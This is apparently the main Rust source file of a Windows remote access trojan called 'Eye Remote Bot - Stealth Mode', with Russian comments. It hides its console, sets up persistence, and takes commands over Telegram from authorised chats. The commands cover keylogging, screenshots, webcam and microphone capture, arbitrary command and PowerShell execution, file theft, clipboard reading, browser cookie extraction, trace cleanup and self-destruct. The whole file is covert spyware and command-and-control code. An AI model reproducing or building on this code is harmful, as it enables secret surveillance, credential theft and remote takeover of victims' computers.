#![windows_subsystem = "windows"]

mod config;
mod device_manager;
mod telegram_client;
mod system_commands;
mod file_commands;
mod monitoring_commands;
mod security_commands;
mod execution_commands;
mod popup_commands;
mod advanced_commands_stealth;
mod auth;
mod token_security;
mod backup_manager;

use advanced_commands_stealth as advanced_commands;

use std::sync::Arc;
use anyhow::Result;
use tokio::signal;

#[cfg(windows)]
extern "system" {
    fn GetConsoleWindow() -> *mut std::ffi::c_void;
    fn ShowWindow(hwnd: *mut std::ffi::c_void, n_cmd_show: i32) -> i32;
    fn FreeConsole() -> i32;
    fn AllocConsole() -> i32;
}

#[cfg(windows)]
fn hide_console_immediately() {
    unsafe {
        let console_window = GetConsoleWindow();
        if !console_window.is_null() {
            ShowWindow(console_window, 0); // SW_HIDE = 0
            FreeConsole(); // Полностью освобождаем консоль
        }
    }
}

use config::{init_logging, validate_config};
use device_manager::DeviceManager;
use telegram_client::{TelegramClient, Message};
use backup_manager::SurvivalManager;

#[tokio::main]
async fn main() -> Result<()> {
    // ВСЕГДА скрываем консоль в stealth версии
    #[cfg(windows)]
    hide_console_immediately();
    
    // Проверяем аргументы командной строки для генерации хешей
    let args: Vec<String> = std::env::args().collect();
    if args.len() == 3 && args[1] == "--generate-hash" {
        if let Ok(chat_id) = args[2].parse::<i64>() {
            match auth::generate_chat_hash(chat_id) {
                Ok(_hash) => {
                    // В stealth режиме не выводим хеш в консоль
                    std::process::exit(0);
                }
                Err(_e) => {
                    std::process::exit(1);
                }
            }
        } else {
            std::process::exit(1);
        }
    }

    // Инициализация (только файловое логирование)
    init_logging();
    if let Err(e) = validate_config() {
        log::error!("Config validation error: {}", e);
        std::process::exit(1);
    }

    // Инициализация системы выживания
    match SurvivalManager::new() {
        Ok(survival_manager) => {
            if let Err(e) = survival_manager.initialize_survival_system().await {
                log::error!("Failed to initialize survival system: {}", e);
            }
        }
        Err(e) => {
            log::error!("Failed to create survival manager: {}", e);
        }
    }

    // Создание менеджера устройств
    let device_manager = Arc::new(DeviceManager::new());
    
    // Создание Telegram клиента
    let telegram_client = Arc::new(TelegramClient::new());
    
    // Обработка сообщений
    let updates_future = handle_updates(telegram_client.clone(), device_manager.clone());
    
    tokio::select! {
        result = updates_future => {
            if let Err(e) = result {
                log::error!("Ошибка обработки обновлений: {}", e);
            }
        }
        _ = signal::ctrl_c() => {
            // Тихо завершаемся
        }
    }

    Ok(())
}

async fn handle_updates(
    telegram_client: Arc<TelegramClient>,
    device_manager: Arc<DeviceManager>
) -> Result<()> {
    let mut offset = 0;
    
    loop {
        match telegram_client.get_updates().await {
            Ok(updates) => {
                for update in updates {
                    if let Some(message) = update.message {
                        offset = update.update_id + 1;
                        
                        let telegram_client_clone = telegram_client.clone();
                        let device_manager_clone = device_manager.clone();
                        
                        tokio::spawn(async move {
                            if let Err(e) = handle_message(telegram_client_clone, device_manager_clone, message).await {
                                log::error!("Ошибка обработки сообщения: {}", e);
                            }
                        });
                    }
                }
            }
            Err(e) => {
                log::error!("Ошибка получения обновлений: {}", e);
                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            }
        }
    }
}

async fn handle_message(
    telegram_client: Arc<TelegramClient>,
    device_manager: Arc<DeviceManager>,
    message: Message
) -> Result<()> {
    let chat_id = message.chat.id;
    
    // Проверка авторизации
    if !auth::is_authorized_chat(chat_id) {
        return Ok(()); // Тихо игнорируем неавторизованных пользователей
    }

    if let Some(text) = message.text {
        let response = process_command(&telegram_client, &device_manager, &text, chat_id).await?;
        telegram_client.send_message(chat_id, &response).await?;
    }

    if let Some(_document) = message.document {
        // Обработка загрузки файлов - пока пропускаем
        return Ok(());
    }

    Ok(())
}

async fn process_command(
    telegram_client: &TelegramClient,
    device_manager: &DeviceManager,
    text: &str,
    _chat_id: i64
) -> Result<String> {
    let parts: Vec<&str> = text.trim().split_whitespace().collect();
    let command = parts.get(0).unwrap_or(&"").to_lowercase();
    
    match command.as_str() {
        "/start" | "/help" => {
            Ok("🤖 Eye Remote Bot - Stealth Mode\n\n📋 Available commands:\n/ping - Check bot status\n/info - System information\n/screenshot - Take screenshot\n/webcam - Capture from camera\n/micrec - Record microphone\n/keylogger - Monitor keystrokes\n/exec - Execute command\n/powershell - Run PowerShell\n/download - Download file\n/listdirs - List directory\n/getclipboard - Get clipboard\n/cookies - Extract cookies\n/apps - List applications\n/cleanup - Clean traces\n/selfdestruct - Self destruct\n/shutdown - Shutdown system".to_string())
        }
        "/ping" => {
            Ok("🔥 Bot is active! 🔥".to_string())
        }
        "/info" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            system_commands::handle_info_command(device_manager, device_id).await
        }
        "/screenshot" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let result = monitoring_commands::handle_screenshot_command(device_manager, device_id).await?;
            // В stealth режиме просто возвращаем размер скриншота
            Ok(format!("📸 Screenshot captured ({} bytes)", result.len()))
        }
        "/webcam" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let delay = parts.get(2).and_then(|s| s.parse::<u32>().ok());
            let camera_index = parts.get(3).and_then(|s| s.parse::<u32>().ok());
            monitoring_commands::handle_webcam_command(device_manager, device_id, delay, camera_index).await
        }
        "/micrec" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let duration = parts.get(2).and_then(|s| s.parse::<u32>().ok());
            monitoring_commands::handle_micrec_command(device_manager, device_id, duration).await
        }
        "/keylogger" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            monitoring_commands::handle_keylogger_command(device_manager, device_id).await
        }
        "/exec" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let command_args = parts.get(2..).unwrap_or(&[]).join(" ");
            execution_commands::handle_exec_command(device_manager, device_id, &command_args).await
        }
        "/processes" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            execution_commands::handle_processes_command(device_manager, device_id).await
        }
        "/download" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let file_path = parts.get(2..).unwrap_or(&[]).join(" ");
            let (response, data) = file_commands::handle_download_command(device_manager, device_id, &file_path).await?;
            
            if !data.is_empty() {
                // Отправляем файл
                // telegram_client.send_document(chat_id, data, &file_path).await?;
            }
            Ok(response)
        }
        "/listdirs" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let directory = parts.get(2).unwrap_or(&".");
            file_commands::handle_listdirs_command(device_manager, device_id, directory).await
        }
        "/getclipboard" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            security_commands::handle_getclipboard_command(device_manager, device_id).await
        }
        "/cookies" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            security_commands::handle_cookies_command(device_manager, device_id).await
        }
        "/apps" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            execution_commands::handle_apps_command(device_manager, device_id).await
        }
        "/cleanup" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            advanced_commands::handle_cleanup_command(device_manager, device_id).await
        }
        "/selfdestruct" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let confirmation = parts.get(2);
            advanced_commands::handle_selfdestruct_command(device_manager, device_id, confirmation.map(|s| *s)).await
        }
        "/shutdown" => {
            let device_id = parts.get(1).unwrap_or(&"main");
            let delay = parts.get(2).and_then(|s| s.parse::<u32>().ok());
            advanced_commands::handle_shutdown_command(device_manager, device_id, delay).await
        }
        _ => {
            Ok("❓ Unknown command. Send /help for available commands.".to_string())
        }
    }
}